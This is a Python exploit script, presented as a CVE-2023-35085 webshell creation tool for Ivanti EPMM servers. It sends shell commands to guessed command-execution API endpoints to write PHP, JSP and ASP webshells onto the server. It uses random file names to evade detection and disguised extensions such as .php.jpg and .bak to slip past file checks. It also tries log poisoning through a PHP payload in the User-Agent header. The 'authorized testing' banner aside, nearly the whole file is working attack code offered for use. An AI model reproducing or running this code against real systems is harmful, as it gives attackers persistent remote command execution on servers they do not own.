import requests
import sys
import argparse
import warnings
import json
from urllib.parse import urljoin, urlparse, urlunparse
import base64
import time
import random
import string

# Disable InsecureRequestWarning
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

def generate_random_name(length=8):
    """Generate random file name to avoid detection or overwrite"""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def create_webshell(target_url):
    """
    Try to create webshell on the target server
    """
    print(f"[*] Target: {target_url}")
    
    # First verify the vulnerability and detect API location
    actual_api_base = identify_api_endpoint(target_url)
    
    if not actual_api_base:
        print("[!] Unable to identify correct API endpoint. Trying standard path.")
        actual_api_base = target_url
    
    # Define multiple webshell types
    webshell_types = [
        {
            "name": "simple_php",
            "extension": "php",
            "content": "<?php system($_GET['cmd']); ?>",
            "check_param": "cmd=id"
        },
        {
            "name": "simple_jsp",
            "extension": "jsp",
            "content": "<%@ page import=\"java.util.*,java.io.*\"%>\n<%\nif(request.getParameter(\"cmd\")!=null){\n    Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n        out.println(disr);\n        disr = dis.readLine();\n    }\n}\n%>",
            "check_param": "cmd=id"
        },
        {
            "name": "simple_asp",
            "extension": "asp",
            "content": "<%eval request(\"cmd\")%>",
            "check_param": "cmd=Response.Write(CreateObject(\"WScript.Shell\").Exec(\"cmd.exe /c whoami\").StdOut.ReadAll())"
        },
        {
            "name": "hidden_php",
            "extension": "php.jpg",  # Attempt to bypass file type check
            "content": "<?php system($_GET['c']); ?>",
            "check_param": "c=id"
        },
        {
            "name": "backup_file",
            "extension": "bak",  # Looks like an innocent backup file
            "content": "<?php if(isset($_GET['x'])){system($_GET['x']);} ?>",
            "check_param": "x=id"
        }
    ]
    
    # Possible upload locations
    upload_locations = [
        "/mnt/data/www/html",
        "/var/www/html",
        "/usr/local/tomcat/webapps/ROOT",
        "/opt/tomcat/webapps/ROOT",
        "/srv/www",
        "/var/www", 
        "/var/www/mifs",
        "/tmp",  # Temporary directories are usually writable
    ]
    
    # Possible web-accessible paths
    web_paths = [
        "",
        "/mifs",
        "/api",
        "/static",
        "/images",
        "/assets",
        "/uploads",
        "/files",
        "/tmp"
    ]
    
    # Command injection vectors to try
    command_vectors = [
        {
            "endpoint": "/mifs/rest/api/v2/command/exec",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "json_payload": True,
            "payload_template": lambda cmd: {
                "command": cmd,
                "timeout": 60
            }
        },
        {
            "endpoint": "/mifs/aad/api/v2/config/exec",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "json_payload": True,
            "payload_template": lambda cmd: {
                "cmd": cmd,
                "args": []
            }
        },
        {
            "endpoint": "/api/v2/system/shell",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "json_payload": True,
            "payload_template": lambda cmd: {
                "command": cmd
            }
        }
    ]
    
    successful_shells = []
    
    for webshell in webshell_types:
        random_name = generate_random_name()
        shell_filename = f"{random_name}.{webshell['extension']}"
        
        print(f"\n[*] Trying to create {webshell['name']} webshell ({shell_filename})...")
        
        for location in upload_locations:
            full_path = f"{location}/{shell_filename}"
            
            echo_cmd = f"echo '{webshell['content']}' > {full_path} && chmod 644 {full_path} && echo 'SUCCESS:{full_path}'"
            
            for vector in command_vectors:
                full_url = urljoin(actual_api_base, vector["endpoint"])
                print(f"[*] Trying to create webshell via {full_url} at {full_path}...")
                
                try:
                    request_params = {
                        "url": full_url,
                        "verify": False,
                        "timeout": 10,
                        "headers": vector["headers"] if "headers" in vector else {}
                    }
                    
                    if vector["json_payload"] and vector["payload_template"]:
                        request_params["json"] = vector["payload_template"](echo_cmd)
                    
                    if vector["method"] == "POST":
                        response = requests.post(**request_params)
                    else:
                        response = requests.get(**request_params)
                    
                    print(f"[*] Request sent, status code: {response.status_code}")
                    
                    if "SUCCESS:" in response.text:
                        print(f"[+] Webshell may have been created at {full_path}")
                        
                        for web_path in web_paths:
                            shell_url = urljoin(target_url, f"{web_path}/{shell_filename}")
                            check_url = f"{shell_url}?{webshell['check_param']}"
                            print(f"[*] Trying to access webshell: {check_url}")
                            
                            try:
                                check_response = requests.get(check_url, verify=False, timeout=5)
                                
                                if check_response.status_code == 200 and (
                                    "uid=" in check_response.text or 
                                    "gid=" in check_response.text or
                                    "groups=" in check_response.text or
                                    "NT AUTHORITY" in check_response.text or
                                    "BUILTIN" in check_response.text
                                ):
                                    print(f"[+] Success! Webshell accessible at: {shell_url}")
                                    print(f"[+] Usage: {shell_url}?{webshell['check_param'].split('=')[0]}=YOUR_COMMAND")
                                    print(f"[+] Response preview: {check_response.text[:100]}")
                                    successful_shells.append({
                                        "url": shell_url,
                                        "param": webshell['check_param'].split('=')[0],
                                        "full_path": full_path
                                    })
                                    return successful_shells[0]
                                    
                            except:
                                pass
                    
                except requests.exceptions.Timeout:
                    print(f"[!] Connection timeout")
                except requests.exceptions.RequestException as e:
                    print(f"[!] Connection error: {e}")
                except Exception as e:
                    print(f"[!] Unexpected error: {e}")
    
    print("\n[*] Trying alternative methods...")
    try_file_inclusion_tricks(target_url)
    
    if successful_shells:
        print("\n[+] Successfully created the following webshells:")
        for i, shell in enumerate(successful_shells):
            print(f"  {i+1}. URL: {shell['url']}?{shell['param']}=COMMAND")
            print(f"     File path: {shell['full_path']}")
        return successful_shells[0]
    else:
        print("\n[-] Failed to create an accessible webshell")
        return None

def try_file_inclusion_tricks(target_url):
    """Try file inclusion vulnerability tricks"""
    print("[*] Attempting log poisoning to create webshell...")
    
    log_poisoning_payload = "<?php system($_GET['cmd']); ?>"
    
    headers = {"User-Agent": log_poisoning_payload}
    
    try:
        requests.get(target_url, headers=headers, verify=False, timeout=5)
        print("[*] Log poisoning attempted. Check the following possible log file locations:")
        print("    /var/log/apache2/access.log")
        print("    /var/log/httpd/access_log")
        print("    /var/log/nginx/access.log")
    except:
        pass
    
    writable_locations = [
        "/tmp/shell.php", 
        "/dev/shm/shell.php",
        "/var/tmp/shell.php"
    ]
    
    for location in writable_locations:
        print(f"[*] Trying to write: {location}")
        
        write_cmd = f"echo '<?php system($_GET[\"cmd\"]); ?>' > {location} && chmod 644 {location} && echo 'SUCCESS'"
        
        try:
            url = urljoin(target_url, "/mifs/rest/api/v2/command/exec")
            response = requests.post(
                url,
                json={"command": write_cmd},
                verify=False,
                timeout=5,
                headers={"Content-Type": "application/json"}
            )
            
            if "SUCCESS" in response.text:
                print(f"[+] Possibly written successfully: {location}")
        except:
            pass

def identify_api_endpoint(target_url):
    """
    Try to identify the actual API endpoint
    """
    possible_api_paths = [
        "",
        "/mifs/",
        "/api/",
        "/mifs/rest/api/",
        "/rest/api/"
    ]
    
    print("[*] Probing actual API endpoint...")
    
    for path in possible_api_paths:
        test_url = urljoin(target_url, path)
        probe_url = urljoin(test_url, "api/v2/ping" if not "api" in path else "v2/ping")
        
        try:
            response = requests.get(probe_url, verify=False, timeout=5)
            
            if response.status_code == 200 and not "<!doctype html>" in response.text[:20].lower():
                print(f"[+] Potential API endpoint found: {test_url}")
                return test_url
            else:
                content_type = response.headers.get('Content-Type', '')
                if 'json' in content_type or 'application/json' in content_type:
                    print(f"[+] Potential API endpoint found: {test_url}")
                    return test_url
                
        except:
            pass
    
    try:
        response = requests.get(target_url, verify=False, timeout=5)
        html_content = response.text
        
        import re
        api_patterns = [
            r'["\'](/api/v[0-9]+/)["\']',
            r'["\'](/mifs/api/)["\']',
            r'["\'](/mifs/rest/api/)["\']',
            r'["\'](/rest/api/)["\']'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, html_content)
            if matches:
                api_base = urljoin(target_url, matches[0])
                print(f"[+] Extracted API endpoint from HTML: {api_base}")
                return api_base
                
    except:
        pass
    
    return None

if __name__ == "__main__":
    banner = """
    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃        CVE-2023-35085 Ivanti EPMM WebShell Creation Tool            ┃
    ┃                                                                     ┃
    ┃                    For Authorized Testing Only                      ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    """
    print(banner)
    
    parser = argparse.ArgumentParser(description="Exploit CVE-2023-35085 to create WebShell on Ivanti EPMM servers")
    parser.add_argument("target", help="Target URL (e.g., https://epmm.example.com)")
    parser.add_argument("-p", "--port", type=int, help="Optional target port if not standard 443/80")
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    
    args = parser.parse_args()
    
    target_url = args.target
    
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url
    
    if args.port:
        parsed_url = urlparse(target_url)
        netloc_parts = parsed_url.netloc.split(':')
        new_netloc = f"{netloc_parts[0]}:{args.port}"
        target_url = urlunparse((parsed_url.scheme, new_netloc, parsed_url.path, parsed_url.params, parsed_url.query, parsed_url.fragment))
    
    input("[*] Press Enter to start creating WebShell...")
    
    shell_info = create_webshell(target_url)
    
    if shell_info:
        print("\n[+] WebShell created successfully!")
        print(f"[+] WebShell URL: {shell_info['url']}?{shell_info['param']}=YOUR_COMMAND")
        print(f"[+] Example: {shell_info['url']}?{shell_info['param']}=id")
        print(f"[+] File path on server: {shell_info['full_path']}")
